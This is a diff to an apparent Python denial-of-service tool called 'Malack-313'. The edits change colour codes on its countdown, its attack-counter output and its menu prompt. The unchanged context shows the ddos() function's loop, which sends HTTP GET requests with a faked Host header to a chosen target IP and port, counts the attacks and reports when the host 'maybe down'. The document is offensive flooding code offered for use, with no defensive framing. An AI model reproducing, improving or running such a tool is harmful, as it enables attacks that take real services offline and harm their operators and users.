@@ -34,9 +34,9 @@ def ddos():
     #print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
     time.sleep(4)
     print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
-    print("seconds : 3")
+    print("\033[0;33mseconds : 3\033[0m")
     time.sleep(1)
-    print("seconds : 2")
+    print("\033[1;36mseconds : 2\033[0m")
     time.sleep(1)
     print("seconds : 1")
     time.sleep(1)
@@ -51,9 +51,9 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print("[÷]  \033[0;36mMalack-313 \033[0;31m▒\033[1;37m▒ \033[0;37mGET \033[1;33mattack \033[1;32m@ ▒ \033[0m"+ str(attack_num))
+                print("[÷]  \033[0;36mMalack-313 \033[0;31m▒\033[1;37m▒ \033[0;32mGET \033[1;33mattack \033[1;37m=> \033[1;33m▒ \033[0m"+ str(attack_num))
             except socket.error:
-                print("\033[1;35m Finnaly attack, \033[0;35mHost maybe down \033[0;31m Check ip in check host \033[0m")
+                print("[💥]\033[1;35m Finnaly attack \033[0;31m Check ip in check host \033[0m")
                 break
                 s.close()
 
@@ -96,7 +96,7 @@ def menu():
     print(Fore.YELLOW + Style.BRIGHT +"2. exit.            [2]")
     print("Enter your options .. [e.g 1,2]") 
     global usr
-    usr = input(Fore.YELLOW + Style.BRIGHT + "▒ ▒⟩⟩   " )
+    usr = input(Fore.YELLOW + Style.BRIGHT + "▒▒⟩⟩   " )
     if usr == "1":
         ddos()
     elif usr == "2":
